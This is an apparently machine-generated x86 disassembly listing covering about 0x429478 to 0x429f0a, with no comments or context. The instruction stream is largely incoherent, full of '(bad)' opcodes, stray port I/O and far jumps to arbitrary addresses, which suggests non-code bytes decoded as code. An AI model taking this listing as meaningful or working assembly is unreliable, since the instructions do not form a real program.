  429478:	mov    edi,0xbb2021fc
  42947d:	test   dh,ch
  42947f:	sub    al,0xc7
  429481:	sub    edx,esi
  429483:	mov    al,cl
  429485:	test   al,0x1d
  429487:	jp     0x42947a
  429489:	pop    esp
  42948a:	xchg   edi,eax
  42948b:	add    esi,DWORD PTR [edi+0x60753183]
  429491:	inc    eax
  429492:	inc    ecx
  429493:	aad    0x76
  429495:	stc    
  429496:	dec    esi
  429497:	dec    edi
  429498:	imul   esi,DWORD PTR [edi],0xef687e8e
  42949e:	push   0xffffff9e
  4294a0:	sbb    BYTE PTR [ebx-0x3b],0xcf
  4294a4:	or     al,0xe
  4294a6:	std    
  4294a7:	mov    bh,0xf5
  4294a9:	xchg   edx,eax
  4294aa:	or     al,0x4d
  4294ac:	imul   esi,DWORD PTR [edi+ecx*4+0x71ca35b2],0x70
  4294b4:	pop    esp
  4294b5:	test   DWORD PTR ds:[edx-0x35931e97],esp
  4294bc:	outs   dx,DWORD PTR ds:[esi]
  4294bd:	push   0xffffffc4
  4294bf:	nop
  4294c0:	or     edx,eax
  4294c2:	jle    0x4294a8
  4294c4:	add    al,0xa2
  4294c6:	push   ecx
  4294c7:	push   edx
  4294c8:	stos   DWORD PTR es:[edi],eax
  4294c9:	add    BYTE PTR ds:0xaf610f9e,al
  4294cf:	mov    WORD PTR ds:0x1630ac50,es
  4294d5:	pop    ebp
  4294d6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4294d7:	mov    WORD PTR [ebx-0x65],cs
  4294da:	ds pop ebp
  4294dc:	and    DWORD PTR [ecx+0x3f19d223],ebp
  4294e2:	das    
  4294e3:	ret    
  4294e4:	mov    cl,0x33
  4294e6:	mov    ebp,0xeb5466c0
  4294eb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4294ec:	pop    ebp
  4294ed:	jmp    0x4294ef
	...
  429553:	add    BYTE PTR [eax],al
  429555:	add    BYTE PTR [ebp+ecx*1+0x13],cl
  429559:	sub    al,0x53
  42955b:	ds jg  0x4295cb
  42955e:	dec    esp
  42955f:	arpl   WORD PTR [ebp-0x441f7a16],dx
  429565:	jo     0x4295ce
  429567:	mov    ebx,0x1000001
  42956c:	add    BYTE PTR [eax],al
  42956e:	add    DWORD PTR [edx+0x10],edi
  429571:	nop
  429572:	or     DWORD PTR cs:0x2cf1177d,0xffffffc0
  42957a:	dec    edi
  42957b:	out    dx,al
  42957c:	xlat   BYTE PTR ds:[ebx]
  42957d:	xchg   esp,eax
  42957e:	dec    esp
  42957f:	add    cl,dl
  429581:	ds sahf 
  429583:	into   
  429584:	mov    eax,ds:0x91b1e4e0
  429589:	pop    esi
  42958a:	imul   edx,DWORD PTR [ecx-0x7e9137b],0xffffffd3
  429591:	push   ebx
  429592:	and    al,0x9a
  429594:	mov    dl,0x40
  429596:	js     0x429557
  429598:	sub    DWORD PTR [ebx+edi*8+0x79fa08ef],0xffffffb5
  4295a0:	cli    
  4295a1:	pop    es
  4295a2:	sub    ch,BYTE PTR [edi]
  4295a4:	loop   0x429533
  4295a6:	xor    ah,bl
  4295a8:	xchg   esi,eax
  4295a9:	loopne 0x42958e
  4295ab:	int3   
  4295ac:	jo     0x42955c
  4295ae:	add    eax,0xfdcd59bf
  4295b3:	xchg   edi,eax
  4295b4:	xchg   ebp,eax
  4295b5:	push   0x28
  4295b7:	ror    DWORD PTR [esi],0x3a
  4295ba:	xor    al,0xc3
  4295bc:	dec    ecx
  4295bd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4295be:	dec    eax
  4295bf:	push   ss
  4295c0:	xor    BYTE PTR [ebx*4+0x52064a16],bl
  4295c7:	jecxz  0x429598
  4295c9:	pop    eax
  4295ca:	xchg   ebx,eax
  4295cb:	sub    ecx,esi
  4295cd:	sti    
  4295ce:	addr16 int3 
  4295d0:	aaa    
  4295d1:	mov    esi,0x6de993be
  4295d6:	sub    al,0x43
  4295d8:	mov    edx,0x293e2aa9
  4295dd:	test   DWORD PTR [eax-0x2f302d0e],ecx
  4295e3:	jne    0x42964f
  4295e5:	dec    ecx
  4295e6:	adc    DWORD PTR ds:0x9d3ac31,esp
  4295ec:	rcr    BYTE PTR [edx],0xb1
  4295ef:	inc    edi
  4295f0:	test   dh,cl
  4295f2:	icebp  
  4295f3:	ret    
  4295f4:	pop    ss
  4295f5:	fcomp  QWORD PTR [ecx]
  4295f7:	push   ss
  4295f8:	cmc    
  4295f9:	cmp    al,0x67
  4295fb:	dec    ecx
  4295fc:	sbb    esi,DWORD PTR [eax]
  4295fe:	add    DWORD PTR [esi-0x50],esi
  429601:	in     al,dx
  429602:	aas    
  429603:	jmp    0x20d9:0x1eeb38ef
  42960a:	push   es
  42960b:	pop    ecx
  42960c:	in     eax,dx
  42960d:	jge    0x42964a
  42960f:	fcmovnbe st,st(2)
  429611:	(bad)  
  429613:	not    DWORD PTR [ebp-0xb7d9fe]
  429619:	pop    es
  42961a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42961b:	sub    BYTE PTR [ebp+0x53ec6f55],bl
  429621:	nop
  429622:	repz in eax,0xc0
  429625:	cmp    bl,BYTE PTR ds:0xd8a8cbf6
  42962b:	mov    ah,0x7d
  42962d:	daa    
  42962e:	bound  esp,QWORD PTR cs:[eax+eiz*2-0x19daffc2]
  429636:	in     al,0x78
  429638:	fwait
  429639:	adc    DWORD PTR [ebp-0x7a],esp
  42963c:	cwde   
  42963d:	mov    dl,0x9c
  42963f:	mov    ds:0xd94f46df,eax
  429644:	clc    
  429645:	adc    al,0x8b
  429647:	dec    edi
  429648:	push   0xcccbc03e
  42964d:	jbe    0x429648
  42964f:	addr16 sub dh,0xf2
  429653:	jmp    0x42960e
  429655:	mov    esp,0xc7493d6f
  42965a:	mov    ebp,0x2a62a61b
  42965f:	mov    dh,0x56
  429661:	cmp    dl,dl
  429663:	mov    cl,al
  429665:	(bad)  
  429666:	retf   
  429667:	cmp    ch,ah
  429669:	push   cs
  42966a:	xor    esp,eax
  42966c:	push   edx
  42966d:	mov    al,0x0
	...
  4296d3:	add    BYTE PTR [eax],al
  4296d5:	add    BYTE PTR [ebp+0x1d],ch
  4296d8:	out    0xc0,al
  4296da:	idiv   bl
  4296dc:	outs   dx,DWORD PTR ds:[esi]
  4296dd:	mov    ebp,0xab7b5cea
  4296e2:	mov    eax,0x672b249a
  4296e7:	mov    esp,0x1000001
  4296ec:	add    BYTE PTR [eax],al
  4296ee:	sub    DWORD PTR [ebx-0x30cf41ef],ecx
  4296f4:	fwait
  4296f5:	(bad)  
  4296f6:	jecxz  0x4296ae
  4296f8:	dec    esp
  4296f9:	lock clc 
  4296fb:	fucomip st,st(1)
  4296fd:	mov    DWORD PTR [ecx],edx
  4296ff:	xor    eax,0xdbda6291
  429704:	dec    ebp
  429705:	inc    BYTE PTR [edi]
  429707:	push   eax
  429708:	aaa    
  429709:	xor    al,0x39
  42970b:	pop    ss
  42970c:	pop    es
  42970d:	sbb    cl,ah
  42970f:	sbb    dl,BYTE PTR [ecx+0x2971deb9]
  429715:	test   DWORD PTR [ebp+0x471e31bc],edx
  42971b:	jle    0x4296e7
  42971d:	loop   0x429760
  42971f:	gs mov esp,0x3dbb345
  429725:	ds jmp 0xa1de97ba
  42972b:	cmp    BYTE PTR [esp+edi*2-0x47],dh
  42972f:	or     ecx,DWORD PTR [esi-0x7e]
  429732:	lahf   
  429733:	iret   
  429734:	sahf   
  429735:	xchg   ebx,eax
  429736:	or     al,0xd6
  429738:	cmc    
  429739:	or     al,0xdb
  42973b:	jo     0x42976e
  42973d:	shr    BYTE PTR [esi-0x22ac4a7c],cl
  429743:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  429744:	sbb    ecx,DWORD PTR [esi]
  429746:	jmp    FWORD PTR [ebp-0x52]
  429749:	mov    edi,0xd47f1670
  42974e:	pusha  
  42974f:	mov    eax,ds:0xb59d72e1
  429754:	mov    dh,0x81
  429756:	dec    ebx
  429757:	call   0x7a55:0x7e8831d4
  42975e:	aam    0x9e
  429760:	or     DWORD PTR [edx+0x7e],edi
  429763:	fdivr  QWORD PTR [edx]
  429765:	mov    al,BYTE PTR [ecx]
  429767:	aas    
  429768:	pop    edi
  429769:	adc    BYTE PTR [eax],ch
  42976b:	icebp  
  42976c:	cld    
  42976d:	ja     0x429724
  42976f:	dec    esi
  429770:	inc    edi
  429771:	retf   
  429772:	es push 0xd0967a1b
  429778:	not    BYTE PTR [eax+0x70]
  42977b:	imul   esp,eax,0xffffffb5
  42977e:	(bad)  
  42977f:	out    0xb3,al
  429781:	jnp    0x4297d5
  429783:	mov    bl,0x39
  429785:	and    bh,al
  429787:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  429788:	popf   
  429789:	push   ecx
  42978a:	jge    0x42977f
  42978c:	mov    ds:0xe465e27e,eax
  429791:	and    cl,BYTE PTR [esi-0x1e]
  429794:	cmp    eax,0xaecc1308
  429799:	hlt    
  42979a:	jne    0x42979d
  42979c:	xchg   ebx,eax
  42979d:	adc    BYTE PTR gs:[edi-0x9de219a],dh
  4297a4:	xchg   edi,eax
  4297a5:	aam    0xcb
  4297a7:	push   ds
  4297a8:	mov    ?,WORD PTR [ecx+0x7d]
  4297ab:	retf   
  4297ac:	stos   DWORD PTR es:[edi],eax
  4297ad:	push   0x37efae30
  4297b2:	enter  0xef00,0x3d
  4297b6:	or     dh,BYTE PTR [esi]
  4297b8:	jnp    0x429778
  4297ba:	xor    BYTE PTR ds:0x3ad69786,0xf4
  4297c1:	jmp    DWORD PTR [esi+0x66adf39]
  4297c7:	mov    ds:0xcaca2799,eax
  4297cc:	or     al,0x64
  4297ce:	jno    0x429751
  4297d0:	shr    DWORD PTR [ecx],1
  4297d2:	out    0xf0,al
  4297d4:	sub    edx,ebx
  4297d6:	add    DWORD PTR [ebp-0x320485d9],ecx
  4297dc:	push   edi
  4297dd:	scas   al,BYTE PTR es:[edi]
  4297de:	or     al,0x9a
  4297e0:	sbb    al,0xad
  4297e2:	mov    ebp,0x15a8d62a
  4297e7:	jnp    0x42976f
  4297e9:	popf   
  4297ea:	sahf   
  4297eb:	dec    ebx
  4297ec:	dec    ecx
  4297ed:	pop    ebx
	...
  429856:	xor    BYTE PTR [edx-0x21],al
  429859:	(bad)  
  42985a:	(bad)  
  42985b:	(bad)  
  42985c:	mov    ebp,0x1d164c52
  429861:	pop    ebp
  429862:	jmp    0x42985e
  429864:	loopne 0x429872
  429866:	addr16 mov ebp,0x1000001
  42986c:	add    BYTE PTR [eax],al
  42986e:	arpl   WORD PTR [ebx-0x7d],di
  429871:	test   al,0xd2
  429873:	push   es
  429874:	jae    0x4298a3
  429876:	push   esi
  429877:	and    DWORD PTR [ebx+0x46b7dcd2],edx
  42987d:	fld    TBYTE PTR [esi]
  42987f:	fbld   TBYTE PTR [ebx+ebx*2+0x35]
  429883:	loope  0x42987e
  429885:	ins    DWORD PTR es:[edi],dx
  429886:	lods   al,BYTE PTR ds:[esi]
  429887:	icebp  
  429888:	adc    DWORD PTR cs:[ebx-0x55],edx
  42988c:	and    edx,ebp
  42988e:	lods   al,BYTE PTR ds:[esi]
  42988f:	cmp    DWORD PTR [edi],0x1
  429892:	out    0x4,eax
  429894:	in     eax,dx
  429895:	pushf  
  429896:	ins    BYTE PTR es:[edi],dx
  429897:	cmp    BYTE PTR [ecx],bl
  429899:	ins    DWORD PTR es:[edi],dx
  42989a:	mov    ds:0xdf378352,al
  42989f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4298a0:	leave  
  4298a1:	xor    ch,BYTE PTR [ebx-0x76426481]
  4298a7:	cmp    bl,BYTE PTR [edx+ebp*4+0x5024628a]
  4298ae:	ror    BYTE PTR [edi+0x40],0x33
  4298b2:	cdq    
  4298b3:	jle    0x429856
  4298b5:	or     dl,BYTE PTR [edx]
  4298b7:	sahf   
  4298b8:	jmp    FWORD PTR [eax+0x670a28ad]
  4298be:	pop    es
  4298bf:	mov    DWORD PTR [ebx+0x7b1c7567],0xf5dfacad
  4298c9:	and    al,0xde
  4298cb:	xlat   BYTE PTR ds:[ebx]
  4298cc:	pusha  
  4298cd:	ss dec ebp
  4298cf:	or     al,0x5a
  4298d1:	lods   al,BYTE PTR ds:[esi]
  4298d2:	pop    es
  4298d3:	cmp    al,0xba
  4298d5:	jmp    0x4298de
  4298d7:	je     0x42985c
  4298d9:	push   edx
  4298da:	jb     0x4298de
  4298dc:	and    edi,DWORD PTR [ebx-0x72]
  4298df:	fld    DWORD PTR [ecx-0x46d08747]
  4298e5:	jle    0x42994e
  4298e7:	sub    DWORD PTR cs:[ecx-0x7776fe69],edx
  4298ee:	arpl   WORD PTR [eax-0x6c95ce63],bx
  4298f4:	mov    eax,ds:0x43f501d0
  4298f9:	les    ebp,FWORD PTR [esi+esi*2]
  4298fc:	mov    ecx,DWORD PTR [esi+0x1]
  4298ff:	gs pop eax
  429901:	imul   ebx,DWORD PTR [esi],0xb974ea10
  429907:	out    0xdf,eax
  429909:	xchg   edi,eax
  42990a:	ss clc 
  42990c:	and    cl,bl
  42990e:	sar    BYTE PTR [ecx+esi*4],1
  429911:	iret   
  429912:	mov    edx,0xb728c942
  429917:	loope  0x4298fd
  429919:	scas   eax,DWORD PTR es:[edi]
  42991a:	jmp    0xcce6:0x78e5d68d
  429921:	pop    ds
  429922:	pushf  
  429923:	fwait
  429924:	sub    al,0x51
  429926:	in     al,0xf0
  429928:	loope  0x429933
  42992a:	test   eax,0x8ccf3f64
  42992f:	aaa    
  429930:	pop    edx
  429931:	xchg   edx,eax
  429932:	push   0xc2aeab9
  429937:	cld    
  429938:	test   eax,0xa6a7b72c
  42993d:	rol    BYTE PTR [edx],1
  42993f:	in     eax,dx
  429940:	jl     0x4299bf
  429942:	xchg   edx,eax
  429943:	popf   
  429944:	fs add ebp,ebx
  429947:	call   0x959:0x4eb74df9
  42994e:	inc    esi
  42994f:	xlat   BYTE PTR ds:[ebx]
  429950:	jnp    0x42998c
  429952:	sbb    edi,DWORD PTR [edx+0x247514ac]
  429958:	inc    esi
  429959:	data16 jne 0x42991b
  42995c:	jmp    0x9725:0x7481577b
  429963:	das    
  429964:	or     BYTE PTR [esi+0x5629d7df],dl
  42996a:	iret   
  42996b:	pop    edx
  42996c:	inc    ebp
  42996d:	int    0x0
	...
  4299d3:	add    BYTE PTR [eax],al
  4299d5:	add    BYTE PTR [edi+0x68],dl
  4299d8:	fistp  QWORD PTR fs:[edi-0x21]
  4299dc:	(bad)  
  4299dd:	call   0x3b7e6dd5
  4299e2:	gs xabort 0xf4
  4299e6:	addr16 mov esi,0x1000001
  4299ec:	add    BYTE PTR [eax],al
  4299ee:	xchg   ah,dh
  4299f0:	mov    edx,0x8ffcc35f
  4299f5:	dec    edi
  4299f6:	and    eax,0x228296c2
  4299fb:	add    edx,edi
  4299fd:	add    eax,0x383ef308
  429a03:	int    0x51
  429a05:	iret   
  429a06:	sbb    al,0x5
  429a08:	jmp    0xcb3b:0x285fb76b
  429a0f:	jle    0x429a61
  429a11:	cli    
  429a12:	lods   eax,DWORD PTR ds:[esi]
  429a13:	rol    DWORD PTR [eax-0x7997a9bf],1
  429a19:	and    esp,DWORD PTR [esi-0x46]
  429a1c:	xlat   BYTE PTR ds:[ebx]
  429a1d:	test   eax,0x66986741
  429a22:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  429a23:	in     al,dx
  429a24:	jg     0x4299bc
  429a26:	cmp    al,0x7d
  429a28:	xchg   edx,eax
  429a29:	xor    eax,0xdcecc3f5
  429a2e:	mov    ds:0x185415d4,eax
  429a33:	mov    ?,WORD PTR [edi-0x1c4e9148]
  429a39:	cwde   
  429a3a:	mov    eax,0x14d844e9
  429a3f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  429a40:	mov    ds:0x7af913e6,al
  429a45:	or     BYTE PTR [eax-0x9],cl
  429a48:	loope  0x429a75
  429a4a:	and    al,0xf5
  429a4c:	cmovbe ebp,DWORD PTR [edi+0x18]
  429a50:	ja     0x429aa0
  429a52:	or     al,0x64
  429a55:	inc    esi
  429a56:	and    DWORD PTR [edx+eax*1+0x28],0x2d561893
  429a5e:	push   esp
  429a5f:	mov    cx,0xc707
  429a63:	es fs pop esi
  429a66:	push   esi
  429a67:	sub    al,0x82
  429a69:	pushf  
  429a6a:	neg    BYTE PTR [esi]
  429a6c:	and    edi,DWORD PTR [edx+ebx*8+0x39]
  429a70:	inc    esp
  429a71:	loopne 0x429a98
  429a73:	mov    dl,0x3a
  429a75:	xchg   DWORD PTR [ebx],edi
  429a77:	and    al,0xa8
  429a79:	popf   
  429a7a:	ret    
  429a7b:	xchg   edi,eax
  429a7c:	jg     0x429a53
  429a7e:	mov    bh,0x95
  429a80:	adc    al,0xd3
  429a82:	sbb    dh,bl
  429a84:	icebp  
  429a85:	mov    eax,0x8641d60a
  429a8a:	adc    al,0xca
  429a8c:	pop    eax
  429a8d:	mov    ds:0x57ff0395,al
  429a92:	or     eax,ebx
  429a94:	and    eax,0x61b502e9
  429a99:	dec    esp
  429a9a:	ja     0x429abb
  429a9c:	mov    WORD PTR [ebp+0x1c],?
  429a9f:	pop    esp
  429aa0:	fwait
  429aa1:	xor    esp,DWORD PTR [edi+ebx*2+0x27041fd8]
  429aa8:	imul   edi,ebx,0x2b
  429aab:	js     0x429a4a
  429aad:	dec    ebp
  429aae:	xchg   esp,eax
  429aaf:	fmul   QWORD PTR [ecx-0x6582196e]
  429ab5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  429ab6:	pop    esp
  429ab7:	dec    ecx
  429ab8:	push   0xef858257
  429abd:	lods   eax,DWORD PTR ds:[esi]
  429abe:	imul   eax,DWORD PTR [ebx],0xca029ca
  429ac4:	mov    dh,BYTE PTR [ebx+0x5e80fe08]
  429aca:	push   edi
  429acb:	jmp    0x590b:0xa497a81b
  429ad2:	or     bl,bh
  429ad4:	ds addr16 xchg ebx,eax
  429ad7:	out    0x5,al
  429ad9:	cwde   
  429ada:	stc    
  429adb:	in     eax,dx
  429adc:	cmp    eax,0x106a20d2
  429ae1:	mov    BYTE PTR [esi-0x13],ch
  429ae4:	in     eax,dx
  429ae5:	idiv   BYTE PTR [eax-0x10089a03]
  429aeb:	(bad)  [eax-0x3b]
	...
  429b56:	into   
  429b57:	std    
  429b58:	sti    
  429b59:	leave  
  429b5a:	sti    
  429b5b:	iret   
  429b5c:	(bad)  
  429b5d:	jmp    DWORD PTR ds:0x65a95667
  429b63:	ja     0x429b9c
  429b65:	packuswb mm7,QWORD PTR [edi+0x1000001]
  429b6c:	add    BYTE PTR [eax],al
  429b6e:	test   al,0x5b
  429b70:	xchg   DWORD PTR [edi],ecx
  429b72:	add    ah,BYTE PTR [eax]
  429b74:	aas    
  429b75:	jmp    0x40d:0x76ffbaed
  429b7c:	or     edx,DWORD PTR [ebp+0x5a]
  429b7f:	push   ebp
  429b80:	ror    eax,1
  429b82:	sub    al,0x57
  429b84:	shr    BYTE PTR ds:0x54b53788,0xb6
  429b8b:	and    dl,ch
  429b8d:	add    esp,DWORD PTR [ecx+0x7a0dc1e9]
  429b93:	(bad)  
  429b95:	jne    0x429be5
  429b97:	dec    eax
  429b98:	mov    ah,0x67
  429b9a:	push   edi
  429b9b:	mov    esi,0x7e8be5f0
  429ba0:	adc    al,0xc8
  429ba2:	push   ss
  429ba3:	adc    DWORD PTR [edx],0xba20ab45
  429ba9:	xchg   ah,bl
  429bab:	mov    edi,0xe7298e4d
  429bb0:	mov    ah,0x95
  429bb2:	mov    eax,0x50ce2edc
  429bb7:	je     0x429b92
  429bb9:	mov    ds:0x3dcd19a4,al
  429bbe:	ins    BYTE PTR es:[edi],dx
  429bbf:	sub    bl,ch
  429bc1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  429bc2:	dec    edx
  429bc3:	add    BYTE PTR [edi+0xae8bcbd],0xb5
  429bca:	(bad)  
  429bcb:	lock push es
  429bcd:	mov    dl,0x53
  429bcf:	and    ebp,edi
  429bd1:	xor    ecx,DWORD PTR [edx+0x30d4ac04]
  429bd7:	out    0xa3,eax
  429bd9:	jns    0x429b74
  429bdb:	or     cl,BYTE PTR [esi]
  429bdd:	aad    0x81
  429bdf:	shl    BYTE PTR [eax],0x42
  429be2:	pop    ebx
  429be3:	mov    eax,0x11f7758d
  429be8:	or     DWORD PTR [ebp-0x119cc709],0x72394a12
  429bf2:	or     eax,0x271063d3
  429bf7:	add    ebp,DWORD PTR [ebx-0x70]
  429bfa:	lods   al,BYTE PTR ds:[esi]
  429bfb:	cmp    dh,dh
  429bfd:	retf   
  429bfe:	jecxz  0x429c27
  429c00:	lock push es
  429c02:	fdivr  DWORD PTR [esi-0x7d2a52e9]
  429c08:	loopne 0x429c62
  429c0a:	push   ebx
  429c0b:	popf   
  429c0c:	fwait
  429c0d:	mov    ah,BYTE PTR [ecx]
  429c0f:	cli    
  429c10:	in     eax,dx
  429c11:	pop    ss
  429c12:	fwait
  429c13:	mov    gs,edi
  429c15:	sbb    al,0x26
  429c17:	adc    DWORD PTR [edx+0x49],ebx
  429c1a:	sub    ch,BYTE PTR [esi-0x68]
  429c1d:	mov    al,ds:0xe6410c80
  429c22:	ss pop esi
  429c24:	arpl   WORD PTR [eax],di
  429c26:	out    dx,al
  429c27:	stc    
  429c28:	mov    DWORD PTR [ebp+0x78],ebp
  429c2b:	adc    BYTE PTR cs:[ebx],0xe2
  429c2f:	cli    
  429c30:	sbb    cl,ah
  429c32:	sub    ecx,DWORD PTR [ebx-0x6b1c7b4]
  429c38:	pop    ds
  429c39:	sub    eax,0x3f6cf385
  429c3e:	adc    DWORD PTR [esi],esp
  429c40:	mov    edi,0x30ba3921
  429c45:	cmp    ah,dl
  429c47:	fist   DWORD PTR [edi]
  429c49:	xchg   ecx,eax
  429c4a:	xor    cl,BYTE PTR [esi+0x67]
  429c4d:	and    al,0xc1
  429c4f:	std    
  429c50:	arpl   WORD PTR [ebx],bp
  429c52:	out    0x32,al
  429c54:	(bad)  
  429c55:	jno    0x429c55
  429c57:	outs   dx,DWORD PTR ds:[esi]
  429c58:	dec    ecx
  429c59:	int3   
  429c5a:	and    eax,0x6834430a
  429c5f:	dec    ebx
  429c60:	imul   DWORD PTR [ebp+0x74eab376]
  429c66:	inc    esi
  429c67:	inc    ebp
  429c68:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  429c69:	and    dh,al
  429c6b:	adc    al,0x90
  429c6d:	xor    DWORD PTR [eax],eax
	...
  429cd3:	add    BYTE PTR [eax],al
  429cd5:	add    BYTE PTR [ebx-0x487759ea],ah
  429cdb:	mov    eax,0x89413faf
  429ce0:	(bad)  
  429ce1:	xor    bl,ch
  429ce3:	jb     0x429d4e
  429ce5:	mov    BYTE PTR [edi-0x40],ah
  429ce8:	add    DWORD PTR [eax],eax
  429cea:	add    BYTE PTR [ecx],al
  429cec:	add    BYTE PTR [eax],al
  429cee:	das    
  429cef:	ret    0x8d78
  429cf2:	push   ss
  429cf3:	jne    0x429d6a
  429cf5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  429cf6:	retf   0x4120
  429cf9:	hlt    
  429cfa:	xchg   DWORD PTR [ebx-0x24f9391d],ebx
  429d00:	icebp  
  429d01:	xor    eax,0x7c94753b
  429d06:	jbe    0x429cf9
  429d08:	push   ecx
  429d09:	dec    edi
  429d0a:	loop   0x429ccf
  429d0c:	push   cs
  429d0d:	fimul  WORD PTR [edx+eiz*1+0x70]
  429d11:	arpl   WORD PTR [ebx+0x33c6a6f],cx
  429d17:	lock push ds
  429d19:	aam    0x77
  429d1b:	aad    0x20
  429d1d:	(bad)  
  429d1e:	push   esi
  429d1f:	add    DWORD PTR [eax+0xd5f169d],esi
  429d25:	adc    BYTE PTR [esp+edi*1+0x51],bh
  429d29:	sbb    al,0xa6
  429d2b:	shr    DWORD PTR [ecx+0x2d],cl
  429d2e:	add    DWORD PTR gs:[ebx-0x668b2c02],edi
  429d35:	repz pop esi
  429d37:	push   edx
  429d38:	test   BYTE PTR [edi],bh
  429d3a:	mov    ecx,ebp
  429d3c:	cmp    eax,0xda13be8f
  429d41:	add    esp,0xaf514da8
  429d47:	xchg   ecx,eax
  429d48:	xchg   edx,eax
  429d49:	add    al,0x95
  429d4b:	push   eax
  429d4c:	ret    
  429d4d:	adc    BYTE PTR [eax+0x4fff5d45],0x65
  429d54:	sbb    al,0x7
  429d56:	jbe    0x429d03
  429d58:	pushf  
  429d59:	imul   esp,DWORD PTR [ebp-0x67d20c10],0xa2be846b
  429d63:	jnp    0x429d34
  429d65:	pushf  
  429d66:	dec    ebx
  429d67:	imul   ebp,DWORD PTR [edi-0x49f614b2],0x1671e42e
  429d71:	jae    0x429d84
  429d73:	retf   
  429d74:	in     al,0x54
  429d76:	je     0x429d94
  429d78:	and    BYTE PTR [edi],ah
  429d7a:	sbb    cl,BYTE PTR ds:0xad102926
  429d80:	or     dl,dl
  429d82:	out    dx,eax
  429d83:	popf   
  429d84:	lods   eax,DWORD PTR ds:[esi]
  429d85:	pop    edx
  429d86:	lds    esi,FWORD PTR [edi]
  429d88:	sbb    al,0xa9
  429d8a:	mov    esp,0x4b395271
  429d8f:	je     0x429d18
  429d91:	aas    
  429d92:	in     eax,0x2f
  429d94:	(bad)  
  429d96:	nop
  429d97:	enter  0xaece,0x15
  429d9b:	pusha  
  429d9c:	jmp    0xf18d:0x38db72b8
  429da3:	scas   al,BYTE PTR es:[edi]
  429da4:	cmp    eax,DWORD PTR [edi-0x33c2fb93]
  429daa:	or     BYTE PTR [esi],al
  429dac:	test   al,0x5
  429dae:	pop    ds
  429daf:	adc    eax,0x7e0515e9
  429db4:	xor    eax,0xd7abc725
  429db9:	dec    ebp
  429dba:	aad    0x34
  429dbc:	shl    DWORD PTR [ecx+0x47],0x5f
  429dc0:	inc    edi
  429dc1:	push   es
  429dc2:	lods   eax,DWORD PTR ds:[esi]
  429dc3:	or     bh,BYTE PTR ds:0x4ef2a681
  429dc9:	xchg   ebp,eax
  429dca:	push   edi
  429dcb:	dec    ecx
  429dcc:	pop    ds
  429dcd:	add    al,0x6e
  429dcf:	ins    DWORD PTR es:[edi],dx
  429dd0:	fld    QWORD PTR [edx+0x8]
  429dd3:	pop    ss
  429dd4:	cmc    
  429dd5:	nop
  429dd6:	iret   
  429dd7:	sub    ebx,esp
  429dd9:	sbb    esi,esp
  429ddb:	pop    esi
  429ddc:	xchg   esi,eax
  429ddd:	loop   0x429e57
  429ddf:	int    0x9
  429de1:	arpl   WORD PTR [esi-0x1d0e7ccd],bx
  429de7:	mov    cl,0xfc
  429de9:	(bad)  
  429dea:	xchg   bh,dl
  429dec:	fidiv  DWORD PTR [esi]
	...
  429e56:	fwait
  429e57:	mov    bh,0xc4
  429e59:	or     al,0xec
  429e5b:	jg     0x429e38
  429e5d:	mov    bh,0xe1
  429e5f:	sahf   
  429e60:	loop   0x429eca
  429e62:	je     0x429ded
  429e64:	sub    BYTE PTR [ebp+0x67],bl
  429e67:	rol    DWORD PTR [ecx],0x0
  429e6a:	add    BYTE PTR [ecx],al
  429e6c:	add    BYTE PTR [eax],al
  429e6e:	fiadd  DWORD PTR [edx+0x74]
  429e71:	xlat   BYTE PTR ds:[ebx]
  429e72:	jg     0x429ea0
  429e74:	shl    DWORD PTR [ebx+0x439a8292],1
  429e7a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  429e7b:	repz cmc 
  429e7d:	(bad)  
  429e7f:	lahf   
  429e80:	cmp    BYTE PTR [eax+edx*1-0x5ae345a0],bh
  429e87:	scas   eax,DWORD PTR es:[edi]
  429e88:	mov    bl,0xa7
  429e8a:	fbstp  TBYTE PTR [esi+ebp*2-0x4d2be615]
  429e91:	sbb    eax,0xc80abd35
  429e96:	inc    ebx
  429e97:	sub    al,0x8e
  429e99:	scas   eax,DWORD PTR es:[edi]
  429e9a:	mov    eax,0xb3751d7c
  429e9f:	pop    eax
  429ea0:	xchg   edi,eax
  429ea1:	add    eax,ecx
  429ea3:	cmp    eax,0x4bfae67e
  429ea8:	mov    ?,ecx
  429eaa:	loop   0x429e81
  429eac:	adc    BYTE PTR [ecx],bh
  429eae:	xor    ecx,DWORD PTR [esi+0x7b]
  429eb1:	xor    al,0x82
  429eb3:	lea    edx,[esi]
  429eb5:	jo     0x429f0f
  429eb7:	test   eax,0xc9d3e771
  429ebc:	or     DWORD PTR [edx-0xe1be577],esp
  429ec2:	fldcw  WORD PTR [ecx+0x2b814e0f]
  429ec8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  429ec9:	sub    al,0xe0
  429ecb:	neg    BYTE PTR [eax]
  429ecd:	mov    DWORD PTR [ebx],ebp
  429ecf:	(bad)  
  429ed0:	adc    dl,BYTE PTR ds:0x7c4f2b8a
  429ed6:	out    0x48,al
  429ed8:	outs   dx,BYTE PTR ds:[esi]
  429ed9:	leave  
  429eda:	push   cs
  429edb:	mov    ebx,0xdfe1776a
  429ee0:	dec    ebp
  429ee1:	sub    al,0xe7
  429ee3:	xor    al,0xdc
  429ee5:	xor    al,0x11
  429ee7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  429ee8:	jg     0x429f12
  429eea:	or     ebx,DWORD PTR [edx-0x70726be]
  429ef0:	mov    ebx,0xa4875cd2
  429ef5:	or     bl,BYTE PTR [ebx+0x40]
  429ef8:	or     esp,DWORD PTR [edx-0xfb9f561]
  429efe:	rcl    edi,0x7c
  429f01:	sub    dl,BYTE PTR [edx-0x5d]
  429f04:	cmp    esi,DWORD PTR [edi+edi*1+0xa]
  429f08:	inc    esp
  429f09:	dec    eax
  429f0a:	aas    
